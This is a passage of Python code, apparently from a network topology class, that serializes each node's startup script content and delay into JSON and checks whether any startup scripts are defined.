        for node_id, startup_script in self.startup_scripts.items():
            node = self.nodes.get(node_id)
            node_name = node.name if node else f"n{node_id}"

            scripts.append({
                "node_id": node_id,
                "node_name": node_name,
                "script_content": startup_script.script_content,
                "delay_seconds": startup_script.delay_seconds
            })

        return json.dumps(scripts, indent=2)

    def has_startup_scripts(self) -> bool:
        """Check if this topology has any startup scripts defined."""
        return len(self.startup_scripts) > 0
